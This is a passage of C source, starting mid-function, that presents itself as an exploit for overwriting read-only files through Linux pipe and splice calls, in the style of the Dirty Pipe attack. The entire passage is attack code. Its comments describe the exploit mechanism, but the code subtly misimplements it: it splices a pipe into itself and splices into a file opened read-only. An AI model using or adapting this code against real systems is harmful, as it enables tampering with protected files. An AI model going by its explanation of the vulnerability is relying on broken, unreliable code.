        fprintf(stderr, "Example: %s /mnt/readonly/testfile 0 'HACKED'\n", argv[0]);
        return 1;
    }

    const char *const path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *const data = argv[3];
    const size_t data_size = strlen(data);

    printf("Attempting to overwrite read-only file: %s\n", path);
    printf("Offset: %ld, Data: %s\n", offset, data);

    // Open target file (read-only)
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        return 1;
    }

    // Create a pipe
    int p[2];
    if (pipe(p)) {
        perror("pipe failed");
        close(fd);
        return 1;
    }

    // Fill the pipe with arbitrary data
    size_t n = 0;
    while (n < data_size) {
        size_t m = write(p[1], data + n, data_size - n);
        if (m <= 0) {
            perror("write failed");
            close(fd);
            close(p[0]);
            close(p[1]);
            return 1;
        }
        n += m;
    }

    // Drain the pipe (creates the vulnerability condition)
    if (splice(p[0], NULL, p[1], NULL, data_size, SPLICE_F_MOVE | SPLICE_F_NONBLOCK) < 0) {
        perror("splice failed");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }

    // This is where the actual exploit happens
    // The splice operation leaves the pipe buffer in a special state
    // that allows overwriting read-only file pages
    n = 0;
    while (n < data_size) {
        size_t m = splice(p[0], NULL, fd, &offset, data_size - n, SPLICE_F_MOVE | SPLICE_F_NONBLOCK);
        if (m <= 0) {
            break;
        }
        n += m;
    }

    printf("Exploit attempted. Check if file was modified.\n");

    close(fd);
    close(p[0]);
    close(p[1]);
    return 0;
}
